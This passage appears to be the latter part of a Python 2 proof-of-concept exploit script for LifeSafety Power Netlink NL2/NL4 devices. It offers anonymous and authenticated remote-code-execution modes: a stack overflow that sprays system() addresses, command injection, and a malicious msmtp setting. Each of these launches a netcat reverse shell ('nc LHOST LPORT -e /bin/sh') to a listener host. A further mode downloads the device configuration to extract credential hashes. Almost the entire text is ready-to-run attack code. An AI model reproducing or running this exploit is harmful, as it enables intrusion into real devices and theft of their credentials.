					'0x0000A028',	# system()
					'0x0000A534',	# system()
					'0x0000A608',	# system()
					'0x0000A78C',	# system()
					'0x0000A7B8',	# system()
					'0x0000A9A0',	# system()
					'0x0000B04C',	# system()
					'0x00011E00',	# system()
					'0x0001205C',	# system()
					'0x00012604',	# system()
					'0x000128BC',	# system()
					'0x00012960',	# system()
					'0x000129EC',	# system()
					'0x00012A74',	# system()
					'0x00012AF8',	# system()
					'0x00012B90',	# system()
					'0x00012C28',	# system()
					'0x00012CC0',	# system()
					'0x00012E64',	# system()
					'0x00012F80',	# system()
					'0x00013478'	# system()
#					'0x00011278',	# popen()
			]

		}

		#
		# random stuff to select CGI target and random system() call
		#
		CGI_random = randint(0, len(target_db)-1)
		CGI = target_db.keys()[CGI_random]

		SYSTEM_random = randint(0, len(target_db[CGI])-1)

		URL_SYSTEM = self.URL_Encode_LE(target_db[CGI][SYSTEM_random])

		print "[i] Random CGI: {}, system(): {} Encoded: {}".format(CGI,target_db[CGI][SYSTEM_random],URL_SYSTEM)

 		try:

 			URI = '/'
			URI += CGI
 			if not CGI == 'index.cgi':
				URI += '?'

			RCE = 'nc%20LHOST%20LPORT%20-e/bin/sh&%00' # fork() + NULL char #32
			RCE = RCE.replace("LHOST",self.lhost).replace("LPORT",self.lport)
			RCE += self.random_string(2028 - (len(RCE) -8)) # -8 for the URL encoded chars
			RCE += URL_SYSTEM

			if CGI == 'index.cgi':
				# POST
				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,RCE,None,False)
			else:
				# GET
				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI + RCE,headers,None,None,False)


			print response
		except Exception as e:
#			print e.info(), e.info().get('Content-Length')
			if e.code == 500 and e.info().get('Content-Length') == '542':
				print "[*] Should be OK"

		return
#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	def __init__(self,verbose):
		self.verbose = verbose

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
		i = int(tmp)
		if i < 0 or i > 255:
			return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid DNS name, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False



if __name__ == '__main__':

#
# Help, info and pre-defined values
#	
	INFO =  '[LifeSystem Power Netlink NL2/NL4 PoC (2018 bashis <mcw noemail eu>)]\n'
	HTTP = "http"
	HTTPS = "https"
	proto = HTTP
	verbose = False
	raw_request = True
	rhost = '192.168.57.20'	# Default Remote HOST
	rport = '80'			# Default Remote PORT
	lhost = '192.168.57.1'	# Default Local HOST
	lport = '1337'		# Default Local PORT
	creds = 'admin:admin'			# creds = 'user:pass'
	Cookie = ""


#
# Try to parse all arguments
#
	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
		arg_parser.add_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']')
		arg_parser.add_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')
		arg_parser.add_argument('--get_config', required=False, default=False, action='store_true', help='Try download config and extract credentials (v8.x)')
		arg_parser.add_argument('--v715_rce', required=False, default=False, action='store_true', help='Anonymous RCE for Netlink v7.15 (w/ mongoose web server)')
		arg_parser.add_argument('--v8_hash_rce', required=False, default=False, action='store_true', help='Anonymous RCE for Netlink v8.x (w/ Apache web server)')
		arg_parser.add_argument('--v8_uri_rce', required=False, default=False, action='store_true', help='Anonymous RCE for Netlink v8.x (w/ Apache web server)')
		arg_parser.add_argument('--auth_rce', required=False, default=False, action='store_true', help='Auth RCE for Netlink, add "--get_config" for Anonymous')
		if creds:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ creds + ']')
		arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')
		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
		args = arg_parser.parse_args()
	except Exception as e:
		print INFO,"\nError: %s\n" % str(e)
		sys.exit(1)

	# We want at least one argument, so print out help
	if len(sys.argv) == 1:
		arg_parser.parse_args(['-h'])

	print "\n[*]",INFO

	if args.verbose:
		verbose = args.verbose
#
# Check validity, update if needed, of provided options
#
	if args.https:
		proto = HTTPS
		if not args.rport:
			rport = '443'

	if creds and args.auth:
		creds = args.auth

	if args.rport:
		rport = args.rport

	if args.rhost:
		rhost = args.rhost

	if args.lport:
		lport = args.lport

	if args.lhost:
		lhost = args.lhost

	# Check if RPORT is valid
	if not Validate(verbose).Port(rport):
		print "[!] Invalid RPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print "[!] Invalid RHOST"
		sys.exit(1)

	# Check if LHOST is valid IP or FQDN, get IP back
	lhost = Validate(verbose).Host(lhost)
	if not lhost:
		print "[!] Invalid LHOST"
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print "[!] Invalid RHOST"
		sys.exit(1)

#
# Validation done, start print out stuff to the user
#
	if args.https:
		print "[i] HTTPS / SSL Mode Selected"
	print "[i] Remote target IP:",rhost
	print "[i] Remote target PORT:",rport
	print "[i] Local target IP:",lhost
	print "[i] Local target PORT:",lport

	rhost = rhost + ':' + rport

	headers = {
		'Content-Type'	:	'application/x-www-form-urlencoded',
		'Connection':' close',
		'Cookie':' right=3; loginname=admin; Accept=yes; hash_key=kwitfbcuvnnxdjyp; viewnavi=yes',
		'User-Agent':'Chrome/5.0'
		}

	RCE = "$(nc${IFS}LHOST${IFS}LPORT${IFS}-e/bin/sh)"
	RCE = RCE.replace("LHOST",lhost).replace("LPORT",lport)

	try:
		
		#
		# Check if remote is Netlink, and if running 'Apache' or 'mongoose' web server.
		# (If remote are not Netlink, this function will tell and exit)
		#
		# True == Apache Web Server (v8.x), False == Mongoose Web Server (v7.x)
		#
		Netlink_Version = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).Verify_Target(headers, lhost, lport)

		#
		# Check if remote target is vulnerable
		#
		Vulnerable = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).Check_Vulnerable(headers, lhost, lport, Netlink_Version)

		if Vulnerable:
			print "[i] Remote target is vulnerable"

			#
			# Try get version of remote target
			#
			Version = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).Get_Version(headers, lhost, lport)

			if args.v8_uri_rce:
				if Netlink_Version:
					result = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).URI_Decoder_RCE(headers, lhost, lport)
				else:
					print "[!] v8_uri_rce: Older version has the vulnerability, but not implemented"
					sys.exit(1)

			#
			# Anonymous: Execute RCE due to unsanitized user input direct to system() call
			#
			if args.v8_hash_rce:
				if Netlink_Version:
					result = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).v8_hash_rce(headers, lhost, lport)
				else:
					print "[!] v8_hash_rce: Not supported with Mongoose Web Server"
					sys.exit(1)

			#
			# Anonymous: Execute RCE via stack overflow
			#
			if args.v715_rce:
				if not Netlink_Version:
					result = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).v715_rce(headers, lhost, lport)
				else:
					print "[!] v715_rce: Not supported with Apache Web Server"
					sys.exit(1)

			if args.get_config:
				#
				# Anonymous: Try to get all config and extract username/password hash from remote device 
				#
				if Netlink_Version:
					creds = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).Get_allcfg(headers)
					if creds == False:
						print "[!] Extracted Credentials Failed"
				else:
					print "[!] get_config: Not supported with Mongoose Web Server"
					sys.exit(1)

			if args.auth_rce:
				csrftoken = ""
				response = ""
				#
				# Authenticated: Login, Add and execute RCE
				# Anonymous: Combine with '--get_config'
				#
				Cookie, csrftoken = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).Login(csrftoken,response,headers,Cookie)
				Cookie, csrftoken = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).Add_RCE_msmtp(csrftoken,response,headers,Cookie,RCE)
				#
				# Authenticated: Login, and remove RCE
				# Anonymous: Combine with '--get_config'
				#
				Cookie, csrftoken = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).Login(csrftoken,response,headers,Cookie)
				Cookie, csrftoken = LifeSafetyPower(rhost,proto,verbose,creds,raw_request).Del_RCE_msmtp(csrftoken,response,headers,Cookie)
		else:
			print "[i] Remote target not vulnerable"

	except Exception as e:
		print "[!] Detect of target failed ({})".format(e)
		sys.exit(1)

	print "\n[*] All done...\n"
	sys.exit(0)


